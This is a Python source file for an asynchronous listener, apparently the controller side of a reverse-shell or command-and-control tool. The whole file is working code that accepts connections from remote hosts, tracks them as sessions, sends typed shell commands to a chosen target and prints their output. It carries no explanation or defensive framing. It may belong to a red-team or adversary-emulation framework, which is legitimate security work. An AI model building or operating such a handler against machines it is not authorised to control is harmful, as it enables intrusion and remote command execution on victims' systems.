import socket
import struct

from aioconsole import ainput


class Listener:

    def __init__(self, log):
        self.log = log
        self.sessions = []
        self.addresses = []

    async def accept_sessions(self, reader, writer):
        address = writer.get_extra_info('peername')
        connection = writer.get_extra_info('socket')
        connection.setblocking(1)
        self.sessions.append(connection)
        self.addresses.append('%s:%s' % (address[0], address[1]))
        self.log.console('New session: %s:%s' % (address[0], address[1]))

    async def list_sessions(self):
        for i, conn in enumerate(self.sessions):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
                print('--> index:%s | connection:%s' % (i, self.addresses[i]))
            except socket.error:
                del self.sessions[i]
                del self.addresses[i]

    async def read_command_output(self, conn):
        raw_msg_len = await self.recvall(conn, 4)
        if not raw_msg_len:
            return None
        msg_len = struct.unpack('>I', raw_msg_len)[0]
        return await self.recvall(conn, msg_len)

    @staticmethod
    async def recvall(conn, n):
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    async def send_target_commands(self, target):
        conn = self.sessions[target]
        conn.send(str.encode(' '))
        cwd_bytes = await self.read_command_output(conn)
        cwd = str(cwd_bytes, 'utf-8')
        print(cwd, end='')
        while True:
            try:
                cmd = await ainput()
                if cmd == 'background':
                    break
                elif len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = await self.read_command_output(conn)
                    client_response = str(cmd_output, 'utf-8')
                    print(client_response, end='')
            except Exception as e:
                self.log.console('Connection was lost %s' % e, 'red')
                break
